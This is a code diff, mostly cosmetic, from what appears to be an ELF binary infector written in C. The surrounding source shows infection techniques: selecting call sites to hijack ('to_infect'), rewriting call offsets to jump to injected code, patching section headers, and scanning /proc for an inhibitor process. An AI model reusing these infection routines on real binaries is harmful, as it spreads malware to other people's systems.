@@ -84,7 +84,7 @@ static int	valid_call(t_info *info, int pos)
 
 static void	patch_sections_header(t_info *info, size_t offset, size_t to_add)
 {
-	Elf64_Ehdr  *main_header;
+	Elf64_Ehdr 	*main_header;
 	Elf64_Shdr	*header;
 	uint16_t	i;
 
@@ -145,14 +145,14 @@ static void	hook_call(t_info *info, int32_t nb)
 	new_jmp = (int32_t)(info->text_size - (size_t)((size_t)(info->addr_call_to_replace) - (size_t)(info->text_begin)) - 5);
 	new_jmp += ((nb - 1) * 4);
 	ft_memcpy(info->addr_call_to_replace + 1, &new_jmp, sizeof(new_jmp));
-
-
 }
 
 static void	patch_close_entries(t_info *info, int32_t nb)
 {
 	uint32_t	origin;
 	uint32_t	addr_hook;
+	uint32_t	rip;
+	uint32_t	val;
 
 	origin = *(uint32_t *)(info->addr_call_to_replace + 1);
 	if (nb == 1)
@@ -166,8 +166,6 @@ static void	patch_close_entries(t_info *info, int32_t nb)
 	if (nb == 5)
 		ft_memcpy(info->file + info->offset_bis + OFFSET_CALL_5, &origin, 4);
 
-	uint32_t rip;
-	uint32_t val;
 	rip = (uint32_t)(info->addr_bis) + BIS_SIZE + OFFSET_RIP;
 	addr_hook = (uint32_t)((size_t)(info->addr_call_to_replace) - (size_t)(info->text_begin) + info->text_addr)+ 1;
 	val = addr_hook - rip;
@@ -190,6 +188,7 @@ void		epo_parsing(t_info *info)
 	int32_t	nb_call_detected;
 	int32_t	to_infect[5];
 	uint8_t	c;
+	int32_t	nb = 0;
 
 	i = 0;
 	nb_call_detected = 0;
@@ -210,10 +209,8 @@ void		epo_parsing(t_info *info)
 	to_infect[2] = (nb_call_detected * 2) / 5;
 	to_infect[3] = (nb_call_detected * 3) / 5;
 	to_infect[4] = (nb_call_detected * 4) / 5;
-
 	i = 0;
 	nb_call_detected = 0;
-	int32_t	nb = 0;
 	while (i < info->text_size && nb_call_detected <= to_infect[4])
 	{
 		c = *((uint8_t *)(info->text_begin + i));
@@ -233,7 +230,7 @@ void		epo_parsing(t_info *info)
 	}
 }
 
-int			pe_parsing(t_info *info)
+int		pe_parsing(t_info *info)
 {
 	Elf64_Phdr	*program_header;
 	Elf64_Ehdr	*main_header;
@@ -241,7 +238,6 @@ int			pe_parsing(t_info *info)
 	main_header = (Elf64_Ehdr *)(info->file);
 	if (info->file_size < sizeof(Elf64_Ehdr) + (main_header->e_phnum * sizeof(Elf64_Phdr)))
 		return (1);
-
 	program_header = (Elf64_Phdr *)(info->file + sizeof(Elf64_Ehdr));
 	while (program_header->p_type != PT_LOAD)
 		program_header++;
@@ -273,24 +269,23 @@ static int	parse_process(char *path, int pid_len, char *buf_inhibitor)
 		goto end;
 	if ((ft_strncmp(buf_inhibitor, buf_cast + pid_len + 2, 9)) == 0)
 		goto found;
-end:
+	end:
 	ft_sysclose(fd);
 	return (0);
-found:
+	found:
 	ft_sysclose(fd);
 	return (1);
 }
 
 int		check_process(char *path)
 {
-	char					buf_d[1024];
-	char					buf_stat[8];
-	char					buf_inhibitor[12];
+	char			buf_d[1024];
+	char			buf_stat[8];
+	char			buf_inhibitor[12];
 	struct linux_dirent64	*dir;
-	int						fd, n_read, pos;
-	char					buf_path_file[PATH_MAX];
-	int						pid_len;
-
+	int			fd, n_read, pos;
+	char			buf_path_file[PATH_MAX];
+	int			pid_len;
 
 	write_inhibitor(buf_inhibitor);
 	write_stat(buf_stat);
@@ -315,7 +310,7 @@ int		check_process(char *path)
 	}
 	ft_sysclose(fd);
 	return (0);
-found:
+	found:
 	ft_sysclose(fd);
 	return (1);
 }
